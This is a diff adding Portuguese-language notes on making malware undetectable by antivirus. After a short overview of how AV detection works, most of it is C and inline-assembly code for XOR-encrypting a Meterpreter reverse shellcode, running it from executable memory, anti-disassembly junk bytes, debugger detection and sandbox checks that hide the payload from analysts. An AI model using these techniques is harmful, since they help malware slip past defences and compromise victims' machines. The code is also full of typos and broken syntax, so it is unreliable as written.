@@ -1,0 +1,412 @@
+A Arte de Ser Indentectável
+===========================
+
+Estude obfuscação de transporte
+-------------------------------
+. meterpreter rc4
+. tunnel https
+. shell ninja sec burp
+
+O Anti-Vírus
+------------
+. Tradicional
+. Análise por comparação
+. Acionado ao tocar o File System
+
+Análise Estática
+. Analisa o código do programa
+. Disassembly
+. Não executa o programa
+
+Análise Dinâmica
+. Execut e testa o programa
+. Debuga o programa
+. Monitora chamada de API
+
+Sandbox
+. Mecanismo para rodar "separadamente" um programa ou código
+. Ambiente de emulação
+. Espaço de memória separado
+. Emulação de chamada de API
+
+Heurística
+. "Inteligência"
+. Combinação das análises anteriores
+. Baseado em estatísicas e regras de nálise
+. Categoriza código e fragmentos baseados em critérios pré-definidos.
+
+Parte de premissas abstratas pois não sabemos como é o código fonte
+
+Heurística (algumas regras)
+. detecção de stub de decodificação.
+. Potencial endereço IP na memória
+. Modifica configuração de proxy
+. Injeta código em processos
+. Tenta pegar informações de outros processos ou do sistema
+. Análise de entropia
+. Monitora o registro do Windows
+. Decta elevação de privilégio (tentativas)
+. Uso incomum de memória. Abre muitos processos
+. O programa possivelmente checa a presença de Anti-Vírus.
+. etc...
+
+ByPass Conhecidos
+
+Crypters
+. Criptografa o executável.
+. Adiciona um stub de decodificação
+. Executa o binário na memóriaGeralmente usa o método RunPE (forma de executar uma app de forma portable)
+
+Packers
+. Compacta o executável
+. Atua muito parecido com o crypter
+. Adiciona stub de descompactação
+. Eecuta o binário direto na memória
+
+Obfuscação
+. Mistura de códigos inúteis em funções reais
+. Análise estática fica mais difícil
+. Altera a assinatura do binário
+. Pode alterar o fluxo de execução e restabelecer novamente
+
+Anti-Disassembly
+. Técinicas que dificultam o entendimento do assembly
+. Adiciona código lixo
+. Metamorfismo
+. Desvios de fluxos que não interferem na execução final do programa
+
+Anti-Debug
+. Técnica usada para impedir o debug do programa
+. Tenta identificar a presença do debug
+. Desabilita o debug
+. Escapa do controle do debugger
+. Explora vulnerabilidade no debug
+
+Função no Windows IsDebugPresent (se for igual a 1 está sendo debugado, se 0 não)
+0xCC é um breakpoint de software, o malware pode identificar e parar o debug.
+
+Anti-VM
+. Técnica que tentam descobrir se o programa está rodando em ambiente virtualizado
+. Geralmente usado para camuflar aos olhos de researchers
+
+Ferramentas
+. Veil Evasion
+. Hyperion
+. peCloak
+. Insanity
+. theFatRat
+. Powershell tricks (Empire)
+
+Estratégia
+. Tentar identificar a presença do Anti-Vírus
+. Se sim, não executamos a parte maliciosa do código
+. Se não, decodificamos e executamos o shellcode
+
+Shellcode
+. Vantagens: não usar RunPE
+. Meterpreter reverse TCP RC4
+. Parte maliciosa do código
+
+Encryptando
+. Simples XOR encrypt é o suficiente
+. Camufla análise por assinatura
+
+unsigned char key[] = "F0rb1dd3n";
+
+for (int i = 0; i < strlen(buf); i++) {
+   buf[i] ^= key[i % sizeof(key)];
+}
+
+char shellcode[] =
+"\x0a\x65\x9b...";
+
+char key[] = "F0rb1d3n";
+
+Rotina de decrypt
+
+void decryptShellcode() {
+   for (i = 0; i < sizeof(shellcode)-1; i++) {
+      __asm
+	  {
+	     PUSH EAX
+		 XOR EAX, EAX
+		 JZ True1
+		 __asm __emit(0xca)
+		 __asm __emit(0x55)
+		 __asm __emit(0x78)
+		 __asm __emit(0x2c)
+		 __asm __emit(0x02)
+		 __asm __emit(0x9b)
+		 __asm __emit(0x6e)
+		 __asm __emit(0xe9)
+		 __asm __emit(0x3d)
+		 __asm __emit(0x6f)
+	   True1:
+	      POP EAX
+	   }
+	   
+	   shellcode[i] ^= key[i % sizeof(key)];
+	   
+	   __asm
+	   {
+	      PUSH EAX
+		  XOR EAX, EAX
+		  JZ True2
+		  __asm __emit(0xd5)
+		  __asm __emit(0xb6)
+		  __asm __emit(0x43)
+		  __asm __emit(0x87)
+		  __asm __emit(0xde)
+		  __asm __emit(0x37)
+		  __asm __emit(0x24)
+		  __asm __emit(0xb0)
+		  __asm __emit(0x3d)
+		  __asm __emit(0xee)
+	   True2:
+	      POP EAX
+	   }
+	}
+}
+
+Executando Shellcode
+. Extraído do Veil-Evasion
+. Métodos mais comuns para execução de shellcode
+
+LPVOID lpvAddr;
+HANDLE hHand;
+DWORD dwWaitResult;
+DWORD threadID;
+
+lpvAddr = VirtualAlloc(NULL, strlen(buf), 0x3000, 0x40);
+RtMoveMemory(lpvAddr, buf, strlen(buf));
+hHanmd = CreateThread(NULL,0,lpvAddr,NULL,0,&trheadID);
+dwWaitResult = WaitForSingleObject(hHand,INFINITE);
+return 0;
+
+HANDLE heapVar;
+LPVOID lpvAddr;
+HANDLE hHand;
+DWORD dwWaitResult;
+DWORD threadID;
+
+heapVar = HeapCreate(0x00040000, strlen(shellcode), 0); <--- Torna a HEAP Executável
+lpvAddr = HeapAlloc(heapVar, 0x00000008, strlen(shellcode)); <--- Inicializa a aloca~ção de memória Zerada
+RtMoveMemory(lpvAddr, buf, strlen(buf));
+hHanmd = CreateThread(NULL,0,lpvAddr,NULL,0,&trheadID);
+dwWaitResult = WaitForSingleObject(hHand,INFINITE);
+return 0;
+
+-=-=--=-
+
+typedef LPVOID(__cdecl *MYPROC)(HANDLE, DWORD, SIZE_T); // HeapAlloc
+
+void ExecuteShellcode() {
+   HANDLE heapVar;
+   LPVOID lpvAddr;
+   HANDLE hHand;
+   DWORD dwWaitResult;
+   DWORD threadID;
+
+   heapVar = HeapCreate(0x00040000, strlen(shellcode), 0); <--- Torna a HEAP Executável
+   MYPROC Allocate = (MYPROC)GetProcAddress(GetModuleHandle("kernel32.dll"), "HeapAlloc");
+   lpvAddr = Allocate(heapVar, 0x00000008, strlen(shellcode)); <--- Inicializa a aloca~ção de memória Zerada
+   RtMoveMemory(lpvAddr, shellcode, strlen(shellcode));
+   hHanmd = CreateThread(NULL,0,LPTHREAD_START_ROUTIME(lpvAddr),NULL,0,&trheadID);
+   while (true) {
+      BypassAV();
+   }
+}
+
+Anti-Disassembly tricks
+Para fazer o metarmofismo você tem que declarar a sessão de text como executável
+
+__asm
+{
+   xor eax, eax
+   jz label
+   __asm __emit(0xea)
+   
+   label:
+      ...
+}
+#programa comment(linker, "/SECTION:.text,ERW")
+__asm
+{
+   mov eax, something
+   mov [eax], 0x90
+   
+   something:
+      ...
+}
+
+Anti-Debug tricks
+
+Verificando se a flag de debug está habilitada
+__asm
+{
+   move eax, dword ptr fs:[0x18]
+   mov eax, dword ptr [eax+0x30]
+   cmp byte ptr [eax+2],0
+   je final:
+      ...
+}
+
+Tirando o breakpoint (0xCC)
+__asm
+{
+  xor ebx, ebx
+  mov bl, 0xCC
+  inicio:
+     mov eax, inicio
+	 mov ecx, final
+	 sub ecx, inicio
+   loop:
+      cmp byte ptr [eax], bl
+	  jne continualoop
+   continaloop;
+      inc eax
+	  dec ecx
+	  jnz loop
+   final:
+      ...
+}
+
+# Rotina completa
+__asm
+{
+   push ebx
+   push eax
+   push ecx
+   xor ebx, ebx
+   mov bl, 0xCC
+inicio:
+   mov eax, inicio
+   mov ecx, final
+   sub ecx, inicio
+loop:
+   cmp byte ptr [eax], bl
+   jne continualoop
+   mov[eax], 0xEB ; EB = Short Jump
+continaloop;
+   inc eax
+   dec ecx
+   jnz loop
+   mov ecx, 2
+   xor eax, eax
+   jz valid
+   __asm __emit(0x02)
+valid:
+   __asm __emit(0xCC)
+   __asm __emit(0x02)
+   ret
+   __asm __emit(0x01)
+   sub ebx, 0x04
+   mov eax, dword ptr fs: [ebx]
+   add ebx, ebx
+   mov eax, dword ptr [eax+ecx]
+   cmp byte ptr[eax + ecx], 0
+   pop ecx
+   pop eax
+   pop ebx
+   je final
+   __asm __emit(0xea)
+   
+final:
+   //etc
+}
+
+Floodando a sandbox
+
+int count = 0;
+for (int i = 0; i < 100000000; i++) {
+   count++
+}
+
+char * Memdmp = NULL;
+Memdmp = (char *)malloc(100000000);
+if (memdmp != NULL) {
+   memset(Memdmp, 00, 100000000);
+   free(Memdmp);
+} else {
+   return false;
+}
+
+int Tick = GetTickCount();
+Sleep(1000);
+int Tac = GetTickCount();
+if ((Tac - Tick) < 1000) {
+   retorn false;
+}
+
+SYSTEM_INFO SysGuide;
+GetSystemInfo(&SysGuide);
+int CoreNum = SysGuide.dwNumberOfProcessors;
+if (CoreNum < 2) {
+   return false;
+}
+
+LPVOID mem = NULL;
+mem = VirtualAllocExNuma(GetCurrentProcess(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);
+if (mem == NULL) {
+   return false;
+}
+
+DWORD result = FlsAlloc(NULL);
+if (result == FLS_OUT_OF_INDEXES) {
+   return false;
+}
+
+PROCESS_MEMORY_COUNTERS pmc;
+GetProcessMemoryInfo(GetCurrentProcess(), &pmc, sizeof(pmc));
+if (pmc.WorkingSetSize > 3500000) {
+   return 0;
+}
+
+HANDLE proc;
+proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 4);
+if (proc != NULL) {
+   return false;
+}
+
+HANDLE AmberMutex = CreateMutex(NULL, TRUE, "muuuu");
+if (GetLasError() != ERROR_ALREADY_EXISTS) {
+   WinExec("obfs.exe", 0);
+}
+
+HINSTANCE DLL = LoadLibrary(TEXT("fake.exe"));
+if (DLL != NULL) {
+   return false;
+}
+
+int main (int argc, char * argv[]) {
+   if(strstr(argv[0], "obfs.exe") > 0) {
+      // Decrypta shellcode e executa
+   }
+}
+
+
+-=-=-=-=-=-= O código -=-=-=-=-=-=-=-=-
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
